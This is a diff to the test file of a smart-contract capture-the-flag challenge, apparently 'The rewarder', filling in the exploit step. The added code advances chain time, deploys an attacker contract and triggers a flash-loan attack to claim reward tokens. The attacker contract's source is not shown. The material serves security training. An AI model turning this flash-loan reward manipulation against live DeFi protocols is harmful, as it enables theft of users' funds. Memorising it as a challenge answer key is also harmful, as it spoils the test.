@@ -66,6 +66,14 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+        const AttackerContractFactory = await ethers.getContractFactory(
+          "hackRewarderPool",
+            attacker
+        );
+        this.attackerContract = await AttackerContractFactory.deploy(this.rewarderPool.address, this.liquidityToken.address, this.rewardToken.address);
+        this.attackerContract.hackit(this.flashLoanPool.address, TOKENS_IN_LENDER_POOL);
+
     });
 
     after(async function () {
@@ -85,7 +93,6 @@ describe('[Challenge] The rewarder', function () {
             let delta = rewards.sub(ethers.utils.parseEther('25'));
             expect(delta).to.be.lt(ethers.utils.parseUnits('1', 16))
         }
-        
         // Rewards must have been issued to the attacker account
         expect(await this.rewardToken.totalSupply()).to.be.gt(ethers.utils.parseEther('100'));
         let rewards = await this.rewardToken.balanceOf(attacker.address);
